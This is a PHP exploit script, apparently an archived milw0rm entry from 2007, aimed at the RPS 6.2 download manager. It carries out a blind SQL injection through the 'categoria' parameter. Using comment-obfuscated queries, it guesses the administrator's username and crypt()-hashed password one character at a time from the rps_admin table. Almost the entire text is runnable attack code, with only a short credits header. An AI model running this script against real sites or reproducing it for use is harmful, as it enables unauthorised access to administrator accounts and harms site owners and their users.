<?
//RPS 6.2 SQL Injection Exploit
//http://www.rps-project.com/

//Need magic_quotes_gpc = Off;
//by s0cratex
//Contact: s0cratex[at]hotmail[dot]com

//Salu2: rgod, 0pt1x 'n mechas.

error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

$host = "localhost"; $path="/rps"; $id=1;

echo "RPS 6.2 SQL Injection exploit\n-----------------------------\n\n";
echo "Username: ";
$j=1;$result="";
while(!strstr($result,chr(0))){
for($x=0;$x<255;$x++){
$cnx = fsockopen($host,80);
fwrite($cnx, "GET ".$path."/?x=ver_descarga&e=mostrar&categoria=-1'/**/OR/**/1=(SELECT/**/(IF((ASCII(SUBSTRING(username,".$j.",1))=".$x."),1,0))FROM/**/rps_admin/**/WHERE/**/id=".$id.")/* HTTP/1.0\r\nHost: ".$host."\r\n\r\n");
while(!feof($cnx)){ if(ereg("Descargar", fgets($cnx))){ $result .= chr($x);
echo chr($x); break; } }
fclose($cnx);
if ($x==255) {
die("\n Try again...");
}
}
$j++;
}
echo "\n";
echo "Password: ";
$a=1;$result2="";
while(!strstr($result2,chr(0))){
for($i=0;$i<255;$i++){
$cnx2 = fsockopen($host,80);
fwrite($cnx2, "GET ".$path."/?x=ver_descarga&e=mostrar&categoria=-1'/**/OR/**/1=(SELECT/**/(IF((ASCII(SUBSTRING(password,".$a.",1))=".$i."),1,0))FROM/**/rps_admin/**/WHERE/**/id=".$id.")/* HTTP/1.0\r\nHost: ".$host."\r\n\r\n");
while(!feof($cnx2)){ if(ereg("Descargar", fgets($cnx2))){ $result2 .=
chr($i); echo chr($i); break; } }
fclose($cnx2);
if ($i==255) {
die("\n Try again...");
}
}
$a++;
}
echo "\nThe password has been encrypted with crypt() function...\n-----------------------------\n  by s0cratex";
?>

# milw0rm.com [2007-03-04]
